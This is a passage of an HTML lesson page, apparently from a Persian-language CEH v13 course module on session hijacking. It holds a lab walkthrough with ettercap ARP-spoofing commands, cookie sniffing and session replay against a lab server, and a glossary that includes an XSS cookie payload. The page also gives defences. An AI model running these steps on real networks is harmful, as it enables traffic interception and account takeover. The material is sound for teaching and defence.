+            <li><b>تشخیص خودکار حملات:</b> AI می‌تواند الگوهای غیرعادی در رفتار کاربران را شناسایی کند.</li>
+            <li><b>پیش‌بینی حملات:</b> AI می‌تواند حملات Session Hijacking را قبل از وقوع پیش‌بینی کند.</li>
+            <li><b>کاهش مثبت کاذب:</b> AI می‌تواند هشدارهای اشتباه را کاهش دهد.</li>
+            <li><b>تحلیل رفتار کاربر:</b> AI می‌تواند رفتار عادی کاربر را یاد بگیرد و انحرافات را شناسایی کند.</li>
+            <li><b>واکنش خودکار:</b> AI می‌تواند به‌صورت خودکار جلسات مشکوک را قطع کند.</li>
+        </ul>
+
+        <h3>📌 ابزارهای AI-Powered Session Detection:</h3>
+        <ul>
+            <li><b>AI-Based IDS/IPS:</b> سیستم‌های تشخیص نفوذ مبتنی بر AI.</li>
+            <li><b>AI-Powered Behavioral Analysis:</b> تحلیل رفتار کاربر با استفاده از AI.</li>
+            <li><b>AI-Driven Anomaly Detection:</b> تشخیص ناهنجاری‌های جلسات با AI.</li>
+        </ul>
+
+        <div class="info-box">
+            <b>💡 چرا هوش مصنوعی در Session Hijacking مهم است؟</b>
+            <p>
+                هوش مصنوعی می‌تواند حملات Session Hijacking را با دقت بالا و در زمان واقعی تشخیص دهد و از دسترسی غیرمجاز جلوگیری کند.
+            </p>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۶: کارگاه عملی -->
+    <!-- ============================================================ -->
+    <div class="card" id="lab-exercise">
+        <h2>🧪 کارگاه عملی – Session Hijacking</h2>
+        <p>
+            در این کارگاه، شما با تکنیک‌ها و ابزارهای Session Hijacking آشنا خواهید شد و یک سناریوی کامل از ربودن جلسه را در محیط آزمایشگاهی پیاده‌سازی می‌کنید.
+        </p>
+
+        <h3>🎯 هدف کارگاه:</h3>
+        <ul>
+            <li>آشنایی با ابزارهای Session Hijacking مانند Ettercap و Burp Suite.</li>
+            <li>اجرای ARP Spoofing برای MITM.</li>
+            <li>ربودن یک جلسه HTTP با استفاده از کوکی.</li>
+            <li>تشخیص و مقابله با Session Hijacking.</li>
+        </ul>
+
+        <h3>🖥️ محیط مورد نیاز:</h3>
+        <ul>
+            <li><b>حمله‌کننده:</b> Kali Linux</li>
+            <li><b>هدف:</b> یک وب‌سرور آزمایشگاهی (مثل Metasploitable 2 با یک برنامه وب ساده)</li>
+            <li><b>کلاینت:</b> یک مرورگر (Firefox/Chrome) روی یک سیستم ویندوز یا لینوکس</li>
+            <li><b>ابزارها:</b> Ettercap, Wireshark, Burp Suite, Firefox Developer Tools</li>
+        </ul>
+
+        <h3>📝 سناریوی گام‌به‌گام:</h3>
+
+        <h4>مرحله ۱: راه‌اندازی وب‌سرور و کاربر</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># روی سیستم هدف (Metasploitable 2)
+sudo service apache2 start
+
+# کاربر با مرورگر به وب‌سایت متصل می‌شود (مثلاً http://192.168.1.101)</code></pre>
+        </div>
+        <p><b>تحلیل:</b> کاربر وارد وب‌سایت می‌شود و یک کوکی جلسه دریافت می‌کند.</p>
+
+        <h4>مرحله ۲: اجرای ARP Spoofing با Ettercap</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># از Kali Linux
+ettercap -T -M arp:remote /192.168.1.101// /192.168.1.1//</code></pre>
+        </div>
+        <p><b>تحلیل:</b> ترافیک بین کاربر و سرور به مهاجم هدایت می‌شود.</p>
+
+        <h4>مرحله ۳: شنود کوکی با Wireshark</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># در Wireshark، فیلتر http.cookie را اعمال کنید
+# کوکی جلسه را در درخواست‌های HTTP پیدا کنید</code></pre>
+        </div>
+        <p><b>تحلیل:</b> کوکی جلسه کاربر در ترافیک HTTP قابل مشاهده است.</p>
+
+        <h4>مرحله ۴: ربودن جلسه با استفاده از کوکی</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># در Burp Suite یا Firefox Developer Tools
+# ۱. کوکی شناسایی شده را کپی کنید
+# ۲. در مرورگر مهاجم، کوکی را تنظیم کنید
+# ۳. به وب‌سایت متصل شوید و جلسه کاربر را ربوده کنید</code></pre>
+        </div>
+        <p><b>تحلیل:</b> مهاجم با استفاده از کوکی، به حساب کاربر دسترسی پیدا می‌کند.</p>
+
+        <h4>مرحله ۵: تشخیص و مقابله</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># روی سرور، تنظیمات امن کوکی را اعمال کنید
+# HttpOnly, Secure, SameSite
+# تغییر Session ID پس از ورود</code></pre>
+        </div>
+        <p><b>تحلیل:</b> با اعمال تنظیمات امن، حمله خنثی می‌شود.</p>
+
+        <div class="highlight-box">
+            <b>⏳ تکلیف:</b> تمام مراحل بالا را در محیط آزمایشگاهی خود اجرا کنید و یک گزارش کامل از فرآیند حمله، تشخیص و مقابله تهیه کنید.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۷: تمرین‌های عملی -->
+    <!-- ============================================================ -->
+    <div class="card" id="practice-exercises">
+        <h2>📝 تمرین‌های عملی</h2>
+        <p>
+            این تمرینات به شما کمک می‌کنند تا مهارت‌های خود در زمینه Session Hijacking را تقویت کنید.
+        </p>
+
+        <ul>
+            <li>
+                <b>تمرین ۱ – ARP Spoofing:</b>
+                <br>با استفاده از Ettercap، یک حمله ARP Spoofing روی یک شبکه آزمایشگاهی اجرا کنید و ترافیک را با Wireshark تحلیل کنید.
+            </li>
+            <li>
+                <b>تمرین ۲ – ربودن کوکی:</b>
+                <br>با استفاده از Wireshark، یک کوکی جلسه HTTP را از ترافیک استخراج کنید و با Burp Suite آن را دستکاری کنید.
+            </li>
+            <li>
+                <b>تمرین ۳ – Session Fixation:</b>
+                <br>یک سناریوی Session Fixation طراحی کنید و روی یک برنامه وب آزمایشگاهی پیاده‌سازی کنید.
+            </li>
+            <li>
+                <b>تمرین ۴ – تشخیص Session Hijacking:</b>
+                <br>با استفاده از Snort یا Wireshark، یک حمله Session Hijacking را تشخیص دهید.
+            </li>
+            <li>
+                <b>تمرین ۵ – مقابله با Session Hijacking:</b>
+                <br>تنظیمات امن کوکی (HttpOnly, Secure, SameSite) را روی یک وب‌سرور پیاده‌سازی کنید و تأثیر آن را آزمایش کنید.
+            </li>
+        </ul>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۸: واژه‌نامه تخصصی -->
+    <!-- ============================================================ -->
+    <div class="card" id="glossary">
+        <h2>📖 واژه‌نامه تخصصی (Glossary)</h2>
+        <p>
+            در این بخش، تمام واژه‌های تخصصی این ماژول، همراه با <b>ساختار (ریشه یا مخفف)، تعریف ساده، کاربرد در هک، و یک مثال روزمره</b> توضیح داده شده است.
+        </p>
+
+        <div class="table-responsive">
+            <table>
+                <tr>
+                    <th style="min-width:130px;">واژه</th>
+                    <th style="min-width:100px;">ساختار / مخفف</th>
+                    <th>تعریف ساده</th>
+                    <th>کاربرد در هک</th>
+                    <th>مثال</th>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Session Hijacking</span></td>
+                    <td>—</td>
+                    <td>ربودن جلسه کاربر معتبر.</td>
+                    <td>دسترسی غیرمجاز به حساب کاربری.</td>
+                    <td>ربودن کوکی جلسه یک کاربر.</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Session ID</span></td>
+                    <td>—</td>
+                    <td>شناسه منحصربه‌فرد برای یک جلسه.</td>
+                    <td>شناسایی جلسه کاربر.</td>
+                    <td>Session ID در کوکی مرورگر.</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Cookie Hijacking</span></td>
+                    <td>—</td>
+                    <td>ربودن کوکی جلسه کاربر.</td>
+                    <td>دسترسی به جلسه کاربر.</td>
+                    <td>سرقت کوکی با XSS.</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Session Fixation</span></td>
+                    <td>—</td>
+                    <td>تحمیل Session ID به کاربر.</td>
+                    <td>ربودن جلسه با Session ID از پیش تعیین‌شده.</td>
+                    <td>ارسال لینک با Session ID در URL.</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">ARP Spoofing</span></td>
+                    <td>—</td>
+                    <td>جعل جدول ARP برای هدایت ترافیک.</td>
+                    <td>اجرای حملات MITM و Session Hijacking.</td>
+                    <td><code dir='ltr'>ettercap -T -M arp:remote</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">MITM</span></td>
+                    <td><b>M</b>an-<b>i</b>n-<b>t</b>he-<b>M</b>iddle</td>
+                    <td>حمله مرد میانی.</td>
+                    <td>شنود و تغییر ترافیک بین دو طرف.</td>
+                    <td>SSL Stripping.</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">XSS</span></td>
+                    <td><b>C</b>ross-<b>S</b>ite <b>S</b>cripting</td>
+                    <td>تزریق کد جاوااسکریپت به وب‌سایت.</td>
+                    <td>سرقت کوکی، دستکاری جلسات.</td>
+                    <td><code dir='ltr'>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">HttpOnly</span></td>
+                    <td>—</td>
+                    <td>تنظیم کوکی برای عدم دسترسی از طریق جاوااسکریپت.</td>
+                    <td>جلوگیری از سرقت کوکی با XSS.</td>
+                    <td><code dir='ltr'>Set-Cookie: ...; HttpOnly</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Secure Flag</span></td>
+                    <td>—</td>
+                    <td>تنظیم کوکی برای ارسال فقط از طریق HTTPS.</td>
+                    <td>جلوگیری از Sniffing کوکی.</td>
+                    <td><code dir='ltr'>Set-Cookie: ...; Secure</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">SameSite</span></td>
+                    <td>—</td>
+                    <td>تنظیم کوکی برای جلوگیری از ارسال در درخواست‌های Cross-Site.</td>
+                    <td>جلوگیری از CSRF.</td>
+                    <td><code dir='ltr'>Set-Cookie: ...; SameSite=Strict</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Ettercap</span></td>
+                    <td>—</td>
+                    <td>ابزار قدرتمند برای MITM و Session Hijacking.</td>
+                    <td>ARP Spoofing, TCP Hijacking.</td>
+                    <td><code dir='ltr'>ettercap -T -M arp:remote</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Burp Suite</span></td>
+                    <td>—</td>
+                    <td>ابزار تست امنیت وب.</td>
+                    <td>دستکاری کوکی‌ها و جلسات.</td>
+                    <td>دستکاری درخواست‌های HTTP.</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Hunt</span></td>
+                    <td>—</td>
+                    <td>ابزار TCP Session Hijacking.</td>
+                    <td>ربودن جلسات TCP.</td>
+                    <td><code dir='ltr'>hunt -i eth0</code></td>
+                </tr>
+
+            </table>
+        </div>
+
+        <div class="highlight-box">
+            <b>💡 نکته:</b> این واژه‌نامه یک مرجع کامل و سریع برای تمام مفاهیم کلیدی ماژول ۱۱ است. توصیه می‌شود آن را بارها مرور کنید تا اصطلاحات برای شما جا بیفتد.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- جمع‌بندی نهایی -->
+    <!-- ============================================================ -->
+    <div class="highlight-box">
+        <b>💡 جمع‌بندی ماژول ۱۱:</b>
+        <p>
+            در این ماژول با یکی از پیشرفته‌ترین و خطرناک‌ترین حملات سایبری، یعنی <b>Session Hijacking</b> آشنا شدید:
+        </p>
+        <ul>
+            <li><b>تعریف و اهمیت</b> Session Hijacking.</li>
+            <li><b>انواع حملات:</b> فعال، غیرفعال، TCP، UDP، HTTP.</li>
+            <li><b>مراحل یک حمله</b> Session Hijacking.</li>
+            <li><b>تکنیک‌های Spoofing:</b> IP, MAC, ARP, DNS.</li>
+            <li><b>Session Fixation:</b> تحمیل Session ID به کاربر.</li>
+            <li><b>Cookie Hijacking:</b> ربودن کوکی جلسه.</li>
+            <li><b>حملات MITM</b> در Session Hijacking.</li>
+            <li><b>ابزارهای Session Hijacking:</b> Ettercap, Burp Suite, Hunt, BetterCAP.</li>
+            <li><b>تشخیص و مقابله:</b> تنظیمات امن کوکی، HTTPS، MFA.</li>
+            <li><b>نقش هوش مصنوعی</b> در تشخیص و مقابله با Session Hijacking.</li>
+        </ul>
+        <p>
+            <b>📌 گام بعدی:</b> در <a href="../Module_12_Evading_IDS_Firewalls_Honeypots/index.html" style="color:#2a7de1;font-weight:bold;">ماژول ۱۲ – Evading IDS, Firewalls, and Honeypots</a> با تکنیک‌های دور زدن سیستم‌های امنیتی و روش‌های مقابله با آنها آشنا خواهید شد.
+        </p>
+    </div>
+
+    <!-- ===== فوتر ===== -->
+    <div class="footer">
+        <p>دوره جامع CEH V13 | تمامی حقوق برای ارائه‌دهنده محفوظ است.</p>
+        <p style="font-size:0.8rem; margin-top:6px;">ماژول ۱۱ – Session Hijacking | آخرین به‌روزرسانی: ۱۴۰۴</p>
+    </div>
+
+    <!-- ===== اسکریپت کپی ===== -->
+    <script>
+        function copyCode(btn) {
+            const codeBlock = btn.closest('.code-block');
+            if (!codeBlock) return;
+            const codeElement = codeBlock.querySelector('code');
+            if (!codeElement) return;
+            const text = codeElement.innerText;
+            navigator.clipboard.writeText(text).then(() => {
+                const original = btn.innerText;
+                btn.innerText = '✅ کپی شد!';
+                setTimeout(() => {
+                    btn.innerText = original;
+                }, 2000);
+            }).catch(() => {
+                alert('خطا در کپی کردن متن');
+            });
+        }
+    </script>
+
+</body>
+</html>
